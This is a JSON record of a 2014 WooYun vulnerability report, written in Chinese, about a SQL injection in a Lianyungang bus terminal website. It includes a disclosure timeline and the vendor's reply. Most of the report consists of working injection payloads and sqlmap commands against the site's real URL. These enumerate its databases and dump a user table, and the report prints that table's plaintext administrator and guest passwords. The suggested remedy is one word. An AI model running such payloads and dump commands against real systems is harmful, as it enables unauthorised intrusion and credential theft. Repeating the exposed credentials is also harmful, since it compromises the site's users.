{"id": 50101, "wybug_id": "wooyun-2014-078900", "wybug_title": "某省市汽车客运总站SQL注入，拖几个数据库，几十张表，看看管理员密码", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Anonymous.L", "wybug_date": "2014-10-11 11:19", "wybug_open_date": "2014-11-25 11:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "注射", "布尔型盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向公众公开  简要描述： 某省市汽车客运总站SQL布尔型盲注一枚，拖几个数据库，几十张表，看看管理员密码。 详细说明：  问题站点，连云港新浦汽车客运总站URL：http://www.lygbus.com/shownews.php?aou=103注入点：Place: GETParameter: aou    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: aou=103 AND 2729=2729    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: aou=103 AND (SELECT 692 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,102,119,58),(SELECT (CASE WHEN (692=692) THEN 1 ELSE 0 END)),CHAR(58,113,113,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 1 to 10 columns    Payload: aou=-5383 UNION ALL SELECT NULL, NULL, NULL, NULL, CONCAT(CHAR(58,104,102,119,58),IFNULL(CAST(CHAR(81,102,89,109,101,72,72,120,89,90) AS CHAR),CHAR(32)),CHAR(58,113,113,117,58)), NULL, NULL, NULL, NULL#---sqlmap -u \"http://www.lygbus.com/shownews.php?aou=103\" --current-user当前用户：current user:    'lygbus@localhost'数据库：sqlmap -u \"http://www.lygbus.com/shownews.php?aou=103\" --dbs\n\n随便找了个库，拖test库51张表sqlmap -u \"http://www.lygbus.com/shownews.php?aou=103\" -D \"test\" --tables不知道表里还有那些数据，懒得看了\n\n拖lygbus库13张表sqlmap -u \"http://www.lygbus.com/shownews.php?aou=103\" -D \"lygbus\" --tables\n\n随便找了个userpower表看看字段sqlmap -u \"http://www.lygbus.com/shownews.php?aou=103\" -D \"lygbus\" -T \"userpower\" --column\n\n直接看字段数据sqlmap -u \"http://www.lygbus.com/shownews.php?aou=103\" -D \"lygbus\" -T \"userpower\" --dump\n\n逗，明文存储密码，都不md5加密下，不过话又说回来了，谁管这玩意啊，估计研发自己弄着玩的也说不定Database: lygbusTable: userpower[2 entries]+--------+-------+----+----------+--------+| beizhu | cname | id | password | upower |+--------+-------+----+----------+--------+| 系统管理员  | 888   | 2  | 888888   | 管理     || 浏览用户   | guest | 4  | 123456   | 查看     |+--------+-------+----+----------+--------+有可能有os-shell吧，有os-shell，这站估计就可以挂了，没有深入找网站物理路径了\n\nexit   漏洞证明：  如上   修复方案：  过滤   版权声明：转载请注明来源 Anonymous.L@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-10-15 17:42 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}